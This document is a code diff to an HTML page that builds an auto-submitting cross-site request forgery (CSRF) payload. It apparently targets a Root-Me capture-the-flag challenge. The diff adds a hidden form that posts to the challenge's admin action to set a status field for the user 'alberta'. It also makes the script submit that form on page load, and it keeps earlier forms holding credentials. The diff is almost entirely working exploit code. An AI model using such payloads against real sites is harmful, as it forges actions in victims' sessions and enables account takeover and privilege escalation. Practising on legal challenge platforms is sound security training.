@@ -9,10 +9,15 @@
         <input type="hidden" name="username" value="alberta">
         <input type="hidden" name="password" value="tata">
     </form>
+    <form id="csrf3" action="http://challenge01.root-me.org/web-client/ch22/?action=admin" method="POST">
+        <input type="hidden" name="username" value="alberta">
+        <input type="hidden" name="satus" value="1">
+    </form>
 
     <script>
-        <!--document.getElementById("csrf").submit();-->
-        document.getElementById("csrf2").submit();
+        <!--document.getElementById("csrf").submit();
+            document.getElementById("csrf2").submit();-->
+        document.getElementById("csrf3").submit();
     </script>
 </body>
 
